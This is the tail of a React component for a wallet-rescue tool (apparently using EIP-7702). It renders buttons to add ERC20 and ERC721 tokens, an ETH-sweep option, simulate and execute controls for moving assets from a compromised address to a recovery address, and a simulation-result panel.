            <div className="button-group">
              <button type="button" onClick={() => addToken('erc20')} disabled={loading}>
                {t('add_erc20')}
              </button>
            </div>
          )}
          {operationType === 'airdrop' && (
            <div className="button-group">
              <button type="button" onClick={() => addToken('erc20')} disabled={loading}>
                {t('add_erc20')}
              </button>
            </div>
          )}
          {operationType === 'nft' && (
            <div className="button-group">
              <button type="button" onClick={() => addToken('erc721')} disabled={loading}>
                {t('add_erc721')}
              </button>
            </div>
          )}
          {operationType === 'all' && (
            <div className="button-group">
              <button type="button" onClick={() => addToken('erc20')} disabled={loading}>
                {t('add_erc20')}
              </button>
              <button type="button" onClick={() => addToken('erc721')} disabled={loading}>
                {t('add_erc721')}
              </button>
            </div>
          )}
        </div>
      )}

      <div className="form-group">
        <label>
          <input
            type="checkbox"
            checked={sweepEth}
            onChange={(e) => setSweepEth(e.target.checked)}
            disabled={loading || operationType === 'nft'}
          />
          {t('sweep_eth')}
        </label>
      </div>

      {operationType === 'airdrop' && (
        <>
          <div className="button-group">
            <button
              type="button"
              onClick={simulateAirdropRescue}
              disabled={loading || !recoveryAddress || !compromisedAddress || !selectedContract || !airdropContract || (!claimHex && operationType === 'airdrop' && !tokens.find(t => t.address && t.amount)) || (operationType === 'airdrop' && tokens.length > 0 && (!tokens[0].address || !tokens[0].amount))}
            >
              {t('simulate_airdrop_rescue')}
            </button>
            <button
              type="button"
              onClick={() => handleRescue(false)}
              disabled={loading || !recoveryAddress || !compromisedAddress || !selectedContract || !airdropContract || (!claimHex && operationType === 'airdrop' && !tokens.find(t => t.address && t.amount)) || (operationType === 'airdrop' && tokens.length > 0 && (!tokens[0].address || !tokens[0].amount))}
            >
              {loading ? t('processing') : t('execute_airdrop_rescue')}
            </button>
          </div>
        </>
      )}

      {operationType !== 'airdrop' && (
        <div className="button-group">
          <button
            type="button"
            onClick={() => handleRescue(true)}
            disabled={loading || !recoveryAddress || !compromisedAddress || !selectedContract || (tokens.length === 0 && !sweepEth)}
          >
            {t('simulate_rescue')}
          </button>
          <button
            type="button"
            onClick={() => handleRescue(false)}
            disabled={loading || !recoveryAddress || !compromisedAddress || !selectedContract || (tokens.length === 0 && !sweepEth)}
          >
            {loading ? t('processing') : t('execute_rescue', { operationType: operationType.toUpperCase() })}
          </button>
        </div>
      )}

      {message && <p className={message.startsWith(t('error')) ? 'error' : 'success'}>{message}</p>}

      {simulationResult && (
        <div className="simulation-result">
          <h3>{t('simulation_result')}</h3>
          <p>{t('success')}: {simulationResult.success ? t('yes') : t('no')}</p>
          <p>{t('estimated_gas')}: {simulationResult.gasEstimate.toString()}</p>
          <p>{t('tokens_extracted')}:</p>
          <ul>
            {simulationResult.tokensExtracted.map((token, i) => (
              <li key={i}>
                {token.symbol} ({token.address}): {token.amount} {t('to')} {token.destination}
              </li>
            ))}
          </ul>
          <p>{t('eth_swept')}: {simulationResult.ethSwept}</p>
          <p>{t('message')}: {simulationResult.message}</p>
        </div>
      )}
    </div>
  );
};

export default RescueEIP7702;